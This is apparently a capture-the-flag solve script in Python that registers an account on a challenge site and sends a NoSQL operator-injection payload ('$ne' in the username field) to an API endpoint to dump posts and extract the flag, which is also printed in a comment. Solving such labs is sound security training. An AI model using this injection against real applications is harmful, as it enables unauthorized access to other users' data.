import requests
import re


site = 'http://gabibbo_kontakte.challs.olicyber.it/'

s = requests.Session()

register = s.post(f"{site}/register", data = {"username" : "zamzamzam", "password" : "zamzamzam"})
r = s.post(f"{site}/api/posts", json = {"username" : {"$ne" : ""}}).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)


#flag{n0_5ql_n0_1nj3c710n_n0_5cu54_1n73nd3v0_n0_p4r7y}
